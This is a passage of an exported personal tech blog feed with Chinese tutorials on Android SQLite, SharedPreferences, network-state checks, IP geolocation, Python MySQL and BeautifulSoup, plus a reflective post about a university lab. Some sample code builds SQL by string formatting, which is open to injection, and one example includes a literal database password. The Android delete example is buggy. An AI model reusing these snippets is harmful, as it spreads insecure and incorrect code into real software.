db.execSQL(&quot;CREATE TABLE &quot; + TABLE_NAME_STUDENT + &quot;(&quot; + COLUMN_NAME_ID + &quot; INTEGER PRIMARY KEY AUTOINCREMENT,&quot; + COLUMN_NOTE_NO + &quot; TEXT NOT NULL DEFAULT \&quot;\&quot;,&quot; + COLUMN_NOTE_NAME + &quot; TEXT NOT NULL DEFAULT \&quot;\&quot;,&quot; + COLUMN_NOTE_AGE + &quot; INTEGER NOT NULL,&quot; + COLUMN_NOTE_SEX + &quot; TEXT NOT NULL DEFAULT \&quot;男\&quot;&quot; + &quot;)&quot; ); &#125; @Override public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)&#123; // TODO Auto-generated method stub //在这里更新数据库版本 &#125;&#125; 在这个类被实例化的时候，系统会检测这个数据库是否存在，如果已经存在就不再创建，如果不存在则创建。还会检测数据库的版本，当版本号不同时会执行更新操作。 数据库基本操作SQLiteDataBase类提供了大量的API来操控SQLite数据库,每一个SQLiteDatabase的实例就代表了一个数据库(对应底层的一个数据库文件)，一旦应用程序获得了SQLiteDatabase对象，就可以通过该对象来操作与之相对应的数据库。 12SQLiteUtil mSqLiteUtil = new SQLiteUtil(this, &quot;fzy&quot;, null, 1);SQLiteDatabase db = mSqLiteUtil.getWritableDatabase(); //得到一个SQLiteDatabase对象 基本操作写法一对于插入、删除和更新来说都可以通过executeSQL方法执行sql语句来实现。 12db.executeSQL(String sql); db.executeSQL(String sql, Object[] bindArgs); //sql语句中使用占位符，然后第二个参数是实际的参数集 查询可以使用rawQuery方法执行sql语句来实现。 1db.rawQuery(String sql, String[] selectionArgs); 将所有的SQL语句都组织到一个字符串中，使用占位符代替实际参数，selectionArgs就是占位符实际参数集。 基本操作写法二除了统一的形式之外，他们还有各自的操作方法： 插入1db.insert(String table, String nullColumnHack, ContentValues values); 第一个参数都是表示要操作的表名，第二个参数表示如果插入的数据每一列都为空的话，需要指定此行中某一列的名称，系统将此列设置为NULL，不至于出现错误，第三个参数ContentValues类型的变量，是键值对组成的Map，key代表列名，value代表该列要插入的值。 删除1db.delete(String table, String whereClause, String whereArgs); 第一个参数都是表示要操作的表名，第二个参数是用来指定删除条件，传递空值时将删除所有行，第三个参数是删除条件的数组值，将与第二个参数组成条件字符串。 更新1db.update(String table, Contentvalues values, String whereClause, String whereArgs); 第一个参数都是表示要操作的表，第二个参数ContentValues类型的变量，是键值对组成的Map，key代表列名，value代表该列要插入的值。第三个参数用来指定更新条件，传递空值将更新所有行。第四个参数是更新条件的数组值，将与第三个参数组成条件字符串。 查询查询有很多不同参数的方法，这里只列举一例，其他的可以参考官方文档查看。1db.query(String table, String[] columns, String selection, String[] selectionArgs, String groupBy, String having, String orderBy); 第一个参数都是表示要操作的表名，第二个参数表示要查询的列所有名称集，第三个参数selection表示WHERE之后的条件语句，可以使用占位符，groupBy指定分组的列名，having指定分组条件，配合groupBy使用，orderBy指定排序的列名，limit指定分页参数，distinct可以指定“true”或“false”表示要不要过滤重复值。需要注意的是，selection、groupBy、having、orderBy、limit这几个参数中不包括“WHERE”、“GROUP BY”、“HAVING”、“ORDER BY”、“LIMIT”等SQL关键字。 结果集的处理最后，他们同时返回一个Cursor对象，代表数据集的游标，有点类似于JavaSE中的ResultSet。 方法 描述 move(int offset) 以当前位置为参考,移动到指定行 moveToFirst() 移动到第一行 moveToLast() 动到最后一行 moveToPosition(int position) 移动到指定行 moveToPrevious() 移动到前一行 moveToNext() 移动到下一行 isFirst() 是否指向第一条 isLast() 是否指向最后一条 isBeforeFirst() 是否指向第一条之前 isAfterLast() 是否指向最后一条之后 isNull(int columnIndex) 指定列是否为空(列基数为0) isClosed() 游标是否已关闭 getCount() 总数据项数 getPosition() 返回当前游标所指向的行数 getColumnIndex(String columnName) 返回某列名对应的列索引值 getString(int columnIndex) 返回当前行指定列的值 遍历结果集的方法： 1234567Cursor cs = db.query(传入相关参数); //得到结果集if(cs!=null)&#123; while(cs.moveToNext())&#123; cs.getString(cs.getColumnIndex(列名)); //通过列名获得列索引，然后再取出其值 //...获取更多的列值 &#125;&#125; Demo演示这篇博客准备很久了，之前只是知道怎么使用Android的SQLite数据库，并没有系统地去熟悉相关的知识，现在通过查看官方的API文档与别人的博客将这些知识整理了一下，自己写了一个小Demo来熟悉Android的SQLite数据库操作。 核心的代码如下： MainActivity.java123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public void insertData() &#123; //插入数据 // 通过直接执行SQL语句来给学生表插入3条数据 db.execSQL(&quot;INSERT INTO &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; (Sno,Sname,Sage,Ssex) VALUES (&apos;2016001&apos;,&apos;fzy&apos;,&apos;22&apos;,&apos;男&apos;)&quot;); db.execSQL(&quot;INSERT INTO &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; (Sno,Sname,Sage,Ssex) VALUES (&apos;2016002&apos;,&apos;qwe&apos;,&apos;20&apos;,&apos;女&apos;)&quot;); db.execSQL(&quot;INSERT INTO &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; (Sno,Sname,Sage,Ssex) VALUES (&apos;2016003&apos;,&apos;asd&apos;,&apos;19&apos;,&apos;男&apos;)&quot;); // 使用insert方法来给学生表插入一条记录 ContentValues cv = new ContentValues(); cv.put(SQLiteUtil.COLUMN_NOTE_NO, &quot;20160004&quot;); cv.put(SQLiteUtil.COLUMN_NOTE_NAME, &quot;rty&quot;); cv.put(SQLiteUtil.COLUMN_NOTE_AGE, &quot;24&quot;); cv.put(SQLiteUtil.COLUMN_NOTE_SEX, &quot;男&quot;); db.insert(SQLiteUtil.TABLE_NAME_STUDENT, null, cv);&#125;public void deleteData() &#123; // 直接执行SQL语句删除学生表中Sage大于18的学生的所有信息 db.execSQL(&quot;DELETE FROM &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; WHERE Sage = 18&quot;); // 使用delete方法来删除学生表中_id大于1的学生的所有信息 db.delete(SQLiteUtil.TABLE_NAME_STUDENT, &quot;_id&gt;&quot;, new String[] &#123; &quot;1&quot; &#125;);&#125; public void updateData() &#123; // 直接执行SQL语句表中Sno为20160002的学生的名字Sname更新为xxx db.execSQL(&quot;UPDATE &quot; + SQLiteUtil.TABLE_NAME_STUDENT + &quot; SET Sname = &apos;xxx&apos; WHERE Sno = &apos;2016002&apos;&quot;); // 使用update方法来更新学生表中_id大于2的学生的年龄信息 ContentValues cv = new ContentValues(); cv.put(SQLiteUtil.COLUMN_NOTE_AGE, &quot;18&quot;); db.update(SQLiteUtil.TABLE_NAME_STUDENT, cv, &quot;_id&gt;?&quot;, new String[] &#123; &quot;2&quot; &#125;);&#125;public void queryData() &#123; Cursor cs = db.query(SQLiteUtil.TABLE_NAME_STUDENT, null, null, null,null, null, null, null); StringBuilder result = new StringBuilder(); while (cs.moveToNext()) &#123; //遍历结果集 String line = cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_NO)) + cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_NAME)) + cs.getInt(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_AGE)) + cs.getString(cs.getColumnIndex(SQLiteUtil.COLUMN_NOTE_SEX)) + &quot;\n&quot;; result.append(line); &#125; mResult.setText(result); //使用TextView显示出来 cs.close();&#125; 通过在按钮的监听事件中调用这些方法就可以实现我的Demo的功能，这个Demo主要是通过不同的方式来实践数据库的操作，比较简单。效果如下： 数据库管理工具将程序运行在模拟器中后，我们可以打开DDMS工具看到我创建的数据库文件：fzy，将其导出到电脑，使用第三方工具查看。这里讲解一种比较方便的方法，直接使用SDK提供的数据库管理工具来操作，不需要每次更改都将数据库文件导出到windows，具体方法如下： 1、打开Windowsx系统的cmd窗口 2、进入到你的SDK目录下的platform-tools目录下，输入如下命令： 1adb shell 进入调试环境，然后输入如下命令进入到数据库文件夹： 12cd /data/data/包名/databasesls //查看有哪些数据库文件 然后，使用如下sqlite工具打开数据库文件 1sqlite3 数据库文件名 进入sqlite3命令行管理工具，可以通过以下命令进行操作，这与mysql数据库有些区别，命令都是以.号开。 12.help 查看帮助.tables 查看数据库中存在的表 然后就可以对相应的表执行sql语句啦！需要注意的是，sql语句末尾需要加分号，sqlite命令行工具的操作命令不需要加分号。 如下图所示： 参考博客： [1] Android中SQLite应用详解[2] Android 操作SQLite基本用法]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,SQLite］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[每个认真生活的人，都值得被认真对待]]></title>
    <url>%2F2016%2F07%2F25%2F%E6%AF%8F%E4%B8%AA%E8%AE%A4%E7%9C%9F%E7%94%9F%E6%B4%BB%E7%9A%84%E4%BA%BA%EF%BC%8C%E9%83%BD%E5%80%BC%E5%BE%97%E8%A2%AB%E8%AE%A4%E7%9C%9F%E5%AF%B9%E5%BE%85%2F</url>
    <content type="text"><![CDATA[突然，有那么一刻，我会特别想哭。平时，很少总结也很少煽情，现在，回想总结起来，带实验室的这一年里，收获很多，感慨也很多。 这一年里，自己真的花了很多时间很多精力，想各种办法来带大家，虽然我现在也知道自己当时讲课讲得并不好，大家可能在我的课堂上并没有学到太多的东西，所以也很感谢大家能一直听我讲完。现在回想起来可能也是自己当时太急了，想尽快把大家都教会，所以课程讲得很快，也没有很好的考虑大家的感受。也因为深知责任重大，我将自己的很多时间都花在了这里。大三第一个学期，正在带14级的学弟学妹，平时上课，周末的时间都花在实验室，然而自己又报名了软考，那段时间，很纠结，要带大家就不能好好复习，结果第一次考果然没过，还好这学期顺利拿到了软件设计师的证。然后为了蓝桥杯的板子，压缩复习时间，到实验室和陈老师一起调试板子，都是为了大家能够有一个好的训练平台，拿个好的名次。想想，那些纠结的时候义无反顾的抉择又有多少人知道，现在想起来，真的很艰难。但是，看到现在实验室取得的成绩，我也是很感动的，毕竟努力有了收获。 其实，一年下来，坚持下来的人是一定有收获的。有的人慢慢的慢慢的就放弃了，很可惜，这一路上，见证了很多中途退出的人，我也曾经试图挽留，但是都没能留得住。或许，每个人都有每个人的理想。能够一直坚持下来的也算是一种缘分，因为已经不记得有多少个在203奋斗的深夜，不记得有多少一起开怀大笑的日子。也只有真正经常混在一起的这一群人才会有机会一起去聚餐了吧，在一起喝喝酒，聊聊天，就这样也挺好。 这一路走来，要感谢的人也很多。 首先就是一直给予我们支持的指导老师了，很感谢匡老师的到来，没有她也没有实验室的今天，曾经想要放弃的我，在匡老师的带领下一起把实验室带到今天的样子，没有她的支持也没有我当初努力的样子。还记得去北京参加蓝桥杯国赛的时候，比赛完感觉不太好，心情差极了，就怕对不起一直给我们支持和鼓励的匡老师，不过还好，虽然没拿一等奖，但是成绩也不坏。在实验室的管理方面，匡老师确实花了不少的功夫，在协调各个指导老师的时候，我也知道有多难，因为一个实验室五个指导老师，很多事情都需要去协调去处理。然后，就是一直带我们的陈老师了，这学期很多的比赛获奖都是在陈老师的带领下获得的，也确实，陈老师自己也付出了很多，这学期在实验室经常能见到他忙碌的身影，对于每个比赛他都认真对待，自然也能够获得不错的成绩。然后，很感谢陈老师能够和我一起把蓝桥杯的板子做好，这块板子确实起了很大的作用。技术方面，陈老师确实付出了不少，感谢！ 其次，要感谢13级的这几个小伙伴，是你们的坚持，造就了实验室的今天，一直都是你们在支持着我，很感谢，没有你们的付出也没有实验室今天的成绩。看到现在大家的成长我也是很欣慰的，大家都要找工作了，希望大家都能有个美好的未来，说不定以后就是我的面试官了呢，哈哈。 最后，还是要感谢欧超、杨勇锋、李维维等学长为这个实验室的付出，没有你们的基础也没有实验室今天的发展。谢谢欧超学长带我走进这个实验室，带我学习单片机，谢谢杨勇锋学长为电子协会的辛勤付出，也谢谢李维维学长带了我几个假期，还谢谢其他学长平时对我的教导。没有一届一届的付出也就没有未来，希望这种精神能够一届届传递下去。 一直觉得自己是一个很幸运的人，因为大学三年来一直有老师的关心与支持，有学长学姐的帮助与指引，有小伙伴的共同努力，有学弟学妹们的支持。一直很相信一句话：每个认真生活的人，都值得被认真对待。希望你们也如此。 电子设计创新实验室的时光，谢谢有你！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python操作Mysql数据库]]></title>
    <url>%2F2016%2F07%2F24%2FPython%E6%93%8D%E4%BD%9CMysql%E6%95%B0%E6%8D%AE%E5%BA%93%2F</url>
    <content type="text"><![CDATA[在正式开始Python网络爬虫实战之前，我们需要先来了解一下Python的一些基础知识，包括网络请求、数据存储以及异常处理等，这篇博客主要讲解Python的Mysql数据库操作，我们使用爬虫爬取下来的数据需要存储，而数据库就是常用的存储方式之一，所以熟练地掌握数据库操作对于网络爬虫的学习是很有必要的。 安装访问数据库的类库windows下cmd直接执行如下命令进行安装：1pip install pymysql 注：如果没有安装pip包管理器，请先安装pip才能用此命令安装pymysql 基本操作导入库1import mysql 连接数据库123456conn = pymysql.connect(host = &apos;localhost&apos;, user = &apos;你的用户名&apos;, passwd = &apos;你的密码&apos;, charset=&apos;utf8&apos;) #得到连接对象cur=conn.cursor() #得到游标对象cur.execute(&quot;USE school&quot;) #指定使用哪个数据库 插入、查询等基本操作创建表：1cur.execute(&quot;CREATE TABLE student (id TINYINT, Sno VARCHAR(255) UNIQUE KEY, )&quot;) 插入数据：方式一：直接赋值 12cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (&apos;20160001&apos;, &apos;xxx&apos;, 20, &apos;男&apos;)&quot;)conn.commit() #更改数据后需进行提交 方式二：由变量赋值 123456Sno = &apos;20160004&apos;Sname = &apos;lll&apos;Sage = &apos;20&apos;Ssex = &apos;男&apos;cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (\&quot;%s\&quot;,\&quot;%s\&quot;,\&quot;%s\&quot;,\&quot;%s\&quot;)&quot;%(Sno, Sname, Sage, Ssex))conn.commit() #更改数据后需进行提交 查询数据：1cur.execute(&quot;SELECT * FROM Student&quot;) 打印查询结果：12print cur.fetchone() #打印第一条查询结果print cur.fetchall() #打印所有查询结果 关闭连接12cur.close()conn.close() 完整示例创建一张学生表，有id，学号、姓名、年龄、性别五列，然后插入四条数据，在进行查询并打印所有查询结果。 1234567891011121314151617181920212223242526272829303132333435# -*- coding:utf8 -*-import pymysqlconn = pymysql.connect(host = &apos;localhost&apos;, user = &apos;root&apos;, passwd = &apos;fzy1686&apos;, charset=&apos;utf8&apos;)cur=conn.cursor()cur.execute(&quot;USE school&quot;)try: cur.execute(&quot;CREATE TABLE Student (id BIGINT(10) NOT NULL AUTO_INCREMENT,\ Sno VARCHAR(20) NOT NULL,\ Sname VARCHAR(20) NOT NULL,\ Sage VARCHAR(10) NOT NULL,\ Ssex VARCHAR(10) DEFAULT &apos;男&apos;,\ PRIMARY KEY(id))&quot;) cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (&apos;20160001&apos;, &apos;xxx&apos;, 20, &apos;男&apos;)&quot;) cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (&apos;20160002&apos;, &apos;yyy&apos;, 18, &apos;女&apos;)&quot;) cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (&apos;20160003&apos;, &apos;zzz&apos;, 22, &apos;女&apos;)&quot;) Sno = &apos;20160004&apos; Sname = &apos;lll&apos; Sage = &apos;20&apos; Ssex = &apos;男&apos; cur.execute(&quot;INSERT INTO Student (Sno, Sname, Sage, Ssex) VALUES (\&quot;%s\&quot;,\&quot;%s\&quot;,\&quot;%s\&quot;,\&quot;%s\&quot;)&quot;%(Sno, Sname, Sage, Ssex)) conn.commit() cur.execute(&quot;select * from Student&quot;) print cur.fetchall()finally: cur.close() conn.close()]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android数据存储之SharedPreferences]]></title>
    <url>%2F2016%2F07%2F21%2FAndroid%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E4%B9%8BSharedPreferences%2F</url>
    <content type="text"><![CDATA[SharedPreferences是一种轻型的数据存储方式，它的本质是基于xml文件存储的key-value键值对数据，它的使用非常简单,能够轻松的存放数据和读取数据。App都有相应的配置文件，但是由于App的配置信息并不多，如果采用数据库来存放并不划算，因为数据库连接跟操作等耗时大大影响了程序的效率，因此通常使用SharedPreferences来存储一些简单的配置信息。 使用SharedPreferences保存数据获得SharedPreferences对象使用getSharedPreferences方法得到SharedPreferences对象，该方法有两个参数，第一个参数是文件名，第二个参数是权限模式。文件名不需要加后缀，系统在生成该文件时会自动加上.xml后缀。 SharedPreferences的四种操作模式:Context.MODE_PRIVATE：为默认操作模式,代表该文件是私有数据,只能被应用本身访问,在该模式下,写入的内容会覆盖原文件的内容. Context.MODE_APPEND：模式会检查文件是否存在,存在就往文件追加内容,否则就创建新文件. Context.MODE_WORLD_READABLE和Context.MODE_WORLD_WRITEABLE用来控制其他应用是否有权限读写该文件. Context.MODE_WORLD_READABLE：表示当前文件可以被其他应用读取. Context.MODE_WORLD_WRITEABLE：表示当前文件可以被其他应用写入. 获取Editor对象，并使用相应的方法来创建、修和清除数据调用该SharedPreferences对象的Editor接口得到一个Editor对象，使用该对象有putInt，putString等putXxx方法来存储键值对信息，通过remove()方法来移除一个键值对，或者通过clear()方法来清除数据等。 使用commit()方法提交数据。12345SharedPreferences sharedPreferences = getSharedPreferences(&quot;mysp&quot;,Context.MODE_PRIVATE);Editor editor=sharedPreferences.edit();editor.putString(&quot;name&quot;, &quot;fzy&quot;);editor.putString(&quot;age&quot;, &quot;22&quot;);editor.commit(); //提交数据 记得每次更改数据后都要调用editor对象的commit()方法提交数据，执行以上代码后，SharedPreferences将会把这些数据保存在mysp.xml文件中，可以打开eclipse的DDMS工具在File Explorer的data/data/相应的包名/shared_prefs/mysp.xml 下导出该文件，并查看。（如下图红色箭头标注） 我们可以将此xml文件导出来看看，点击右上角pull a file from the device(如下图蓝色箭头标注) 从SharedPreferences获取数据1234SharedPreferences sharedPreferences=getSharedPreferences(&quot;mysp&quot;, Context.MODE_PRIVATE);String name=sharedPreferences.getString(&quot;name&quot;, &quot;defaultname&quot;);String age=sharedPreferences.getString(&quot;age&quot;, &quot;0&quot;);System.out.println(&quot;name: &quot;+ name + &quot;,age: &quot; + age); 取出结果如下：]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,SharedPreferences］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android真机抓屏- Android Screen Monitor]]></title>
    <url>%2F2016%2F07%2F21%2FAndroid%E7%9C%9F%E6%9C%BA%E6%8A%93%E5%B1%8F-Android-Screen-Monitor%2F</url>
    <content type="text"><![CDATA[最近遇到一个比较尴尬的问题，博客需要做一个Android手机网络状态检测的操作演示gif动图，虽然找到一款可以在电脑上录屏并自动生成gif文件的软件，但是eclipse自带的模拟器又不能切换到GPRS网络，于是，想着将真机的屏幕分享到电脑再进行录屏操作，试了华为助手和360助手，但是他们都需要全屏演示，不能很好的结合我的录屏软件，于是又百度找了找，最后还真有个小工具可以实现真机抓屏，反应还挺快，这就是Android Screen Monitor。 ASM简介Android Screen Monitor，简称为ASM，它是一个监视设备或模拟器屏幕的工具，ASM是 ADB调试桥的客户端应用程序，当ASM开始监控屏幕的时候，它通过5037端口连接至ADB，不断地把所监控设备的屏幕数据保存在帧缓存中并且把图像数据转换成用户可观测的内容。 ASM使用方法1、确保你的手机可以进行真机调试 一般我们只要将手机通过USB连接上电脑，并打开USB调试，允许电脑控制我们的手机，然后将项目运行看是否能够运行在我们的真机。 2、ASM下载 最新版本是2.5，下载地址： https://code.google.com/p/android-screen-monitor/downloads/list 貌似要翻墙才能下载，不想翻墙单的话可以私聊我。 3、解压后文件夹中的asm.jar复制到Android SDK的platform-tools目录下 4、打开ASM 方法一：打开cmd，进入到Android SDK的platform-tools目录，然后输入如下命令 1java -jar asm.jar 方法二：直接双击Android SDK的platform-tools目录下的asm.jar文件 5、进入选择界面，选择我们的手机 6、进行相关配置 可右键选择调整窗体大小 至此，我们就实现了将自己的手机屏幕分享到电脑的功能，赶快来体验一下反应快、画面流畅的Android Screen Monitor吧。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,Screen Monitor］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android 网络状态检查总结]]></title>
    <url>%2F2016%2F07%2F20%2FAndroid-%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E6%A3%80%E6%9F%A5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[几乎每个具有连网功能的App都会有网络检测代码专门负责网络检测，需要实时检测网络是否可用，当出现网络不可用或者无连接时提示用户，当需要观看视频时自动检测是否处于wifi网络，并提示用户避免带来大量的流量消耗，所有的这些功能都是为了使App的用户体验更好。此篇博客主要介绍检测网络状态的相关方法，并通过一个小例子来实现实时的网络状态检测。 添加权限在AndroidManifest.xml文件添加： 12&lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;/&gt; &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;/&gt; 编写相应的检测方法判断网络是否可用的方法12345678910public boolean isNetworkAvailable(Context context) &#123; ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mNetworkinfo = mConnectivityManager.getActiveNetworkInfo(); if (mNetworkinfo != null) &#123; return mNetworkinfo.isAvailable(); &#125; &#125; return false;&#125; 判断WIFI网络是否连接上的方法1234567891011public boolean isWifiConnected(Context context) &#123; ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mWiFiNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI); if (mWiFiNetworkInfo != null &amp;&amp; mWiFiNetworkInfo.isConnected()) &#123; return true; &#125; &#125; return false;&#125; 判断GPRS网络是否连接上的方法1234567891011public boolean isMobileConnected(Context context) &#123; ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mMobileNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); if (mMobileNetworkInfo != null &amp;&amp; mMobileNetworkInfo.isConnected()) &#123; return true; &#125; &#125; return false;&#125; 获取所连接网络的类型的方法1234567891011public String getNetworkType(Context context) &#123; ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mNetworkinfo = mConnectivityManager.getActiveNetworkInfo(); if (mNetworkinfo != null &amp;&amp; mNetworkinfo.isAvailable()) &#123; String info = &quot;Type: &quot; + mNetworkinfo.getType() + &quot; Name: &quot;+ mNetworkinfo.getTypeName(); return info; &#125; &#125; return &quot;网络无连接，请检查网络&quot;; &#125; 实现网络状态监测使用Service+BroadcastReceiver来实现相应的功能。 编写网络状态检测类12345678910111213141516171819public class NetState extends BroadcastReceiver &#123; @Override public void onReceive(Context context, Intent intent) &#123; // TODO Auto-generated method stub ConnectivityManager mConnectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE); if (mConnectivityManager != null) &#123; NetworkInfo mMobileNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); NetworkInfo mWiFiNetworkInfo = mConnectivityManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI); if (!mMobileNetworkInfo.isConnected()&amp;&amp; !mWiFiNetworkInfo.isConnected()) &#123; Toast.makeText(context, &quot;网络连接断开，请检查网络&quot;, Toast.LENGTH_SHORT).show(); &#125; else &#123; Toast.makeText(context, &quot;网络连接成功&quot;, Toast.LENGTH_SHORT).show(); &#125; &#125; &#125;&#125; 在Activity的onCreate方法中注册监听12345NetState mNetState = new NetState(); //获取网络监听实例IntentFilter mFilter = new IntentFilter(); //获取意图过滤器实例mFilter.addAction(ConnectivityManager.CONNECTIVITY_ACTION); //过滤Action，使只监听网络动作事件的广播this.registerReceiver(mNetState, mFilter); //注册广播接收器mNetState.onReceive(this, null); //调用广播接收方法 效果演示自己写了一个Android网络检测的演示demo，使用了刚刚学会的录屏生成动图软件以及刚刚安装上的wordpress动图插件。]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>［Android,网络］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python爬虫利器---BeautifulSoup]]></title>
    <url>%2F2016%2F07%2F17%2FPython%E7%88%AC%E8%99%AB%E5%88%A9%E5%99%A8-BeautifulSoup%2F</url>
    <content type="text"><![CDATA[Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。 BeautifulSoup4安装由于BeatifulSoup库不是Python标准库，因此需要单独安装。 在Linux系统上安装1$sudo apt-get install python-bs4 在Windows系统安装可以利用 pip 或者 easy_install 来安装 1pip install beautifulsoup4 1easy_install beautifulsoup4 Beautifulsoup4使用导入库（1）导入网络请求库 Python2.x里的urllib2与urllib有些不同，在Python3.x里，urllib2改名为urllib，被分成一些子模块：urllib.request、urllib.parse、urllib.error。所以不同的版本使用时略有区别。 Python3.x版本：1from urllib.request import urlopen Python2.x版本：1from urllib import urlopen （2）导入Beautifulsoup41from bs4 import BeautifulSoup 运行Beautifulsoup首先我准备了一个简单的测试页面，网址是：blog.line-coding.tech，页面的结构如下： 可以看到我们的img标签在红色箭头标注的位置，我们通过代码一步步的去获取中心404图片的url地址，如下： Python3.x版本： 123456789from urllib.request import urlopenfrom bs4 import BeautifulSouphtml = urlopen(&quot;http://blog.line-coding.com&quot;)bsObj = BeautifulSoup(html.read())print(bsObj.body)print(bsObj.body.div)print(bsObj.body.div.div)print(bsObj.body.div.div.img)print(bsObj.body.div.div.img[&apos;src&apos;]) Python2.x版本： 123456789import urllibfrom bs4 import BeautifulSouphtml = urllib.urlopen(&quot;http://blog.line-coding.com&quot;)bsObj = BeautifulSoup(html,&quot;html.parser&quot;)print bsObj.body #得到body标签的内容print bsObj.body.div #得到body标签下div标签的内容print bsObj.body.div.div #得到body标签下div标签下的div标签的内容print bsObj.body.div.div.img #得到img标签的内容print bsObj.body.div.div.img[&apos;src&apos;] #得到图片url地址 结果如下： 有了Beautiful4，我们就可以将网页代码转换成一个对象，并通过再通过.号去访问这个对象的信息，一级一级的去查找来所需的信息。接下来的博客中，我会使用Beautiful4来进行数据爬取，敬请关注。]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
        <tag>BeautifulSoup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android ip地址信息查询]]></title>
    <url>%2F2016%2F07%2F12%2FAndroid-ip%E5%9C%B0%E5%9D%80%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2%2F</url>
    <content type="text"><![CDATA[上一篇博客中我们讲解了如何获取外网的ip地址，获取到的ip地址总是会有用的，我们现在就来使用它，通过查询ip地址的相关信息我们可以获取当前所在城市信息，即ip地址定位。其实，实现起来也比较简单，主要还是使用的第三方API接口，通过http请求来获取信息。 实现方法百度API Store Ip地址定位API的使用上一步我们获取了本机的外网ip地址，然后我们使用百度API Store的ip地址定位API来进行ip地址定位。API的地址，他有很详细的文档，可以很容易使用。通过Http的GET方法将ip地址发送给服务器，将获取JSON格式的返回值进行解析即可实现定位。如下图所示： android-async-httpandroid-async-http是一个第三方网络请求库，由于在上一篇博客中我们已经为工程添加android-async-http的jar包，所以这里不需要重复添加，可直接进入下一步。 代码编写Handler新建一个Handler用于将Http请求获得的定位数据传回Activity： 123456789101112131415161718192021private Handler mCityHandler = new Handler() &#123; public void handleMessage(Message msg) &#123; String res = (String) msg.obj; //获取传回的定位数据 res = decodeUnicode(res); System.out.println(res); mAddr.setText(res); //显示ip地址定位信息 //也可以进一步解析JSON数据取出所在国家、省份、城市等信息 try &#123; JSONObject js = new JSONObject(res); js = js.getJSONObject(&quot;retData&quot;); String country = js.getString(&quot;country&quot;); String province = js.getString(&quot;province&quot;); String city = js.getString(&quot;city&quot;); System.out.println(&quot;city:&quot; + city); &#125; catch (JSONException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;;&#125;; Http请求在IpHttpUtil类中编写Http请求静态方法，这里还是使用的android-async-http网络请求库，因为它方便、简洁，而且稳定，所以一直喜欢用它。 1234567891011121314151617181920212223242526272829303132333435363738public static void getAddress(final Handler handler, String ip) &#123; //定位信息请求地址 String url = &quot;http://apis.baidu.com/apistore/iplookupservice/iplookup&quot;; AsyncHttpClient client = new AsyncHttpClient(); client.addHeader(&quot;apikey&quot;, &quot;这里填你自己百度API商店注册后的apikey&quot;); RequestParams params = new RequestParams(); params.add(&quot;ip&quot;, ip); //添加参数 client.get(url, params, new AsyncHttpResponseHandler() &#123; @Override public void onSuccess(int arg0, Header[] arg1, byte[] bytes) &#123; // TODO Auto-generated method stub String response = null; try &#123; response = new String(bytes, &quot;GBK&quot;); //获取服务器返回数据 &#125; catch (UnsupportedEncodingException e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; Message msg = new Message(); msg.obj = response; handler.sendMessage(msg); &#125; @Override public void onFailure(int arg0, Header[] arg1, byte[] bytes, Throwable arg3) &#123; // TODO Auto-generated method stub String response = null; 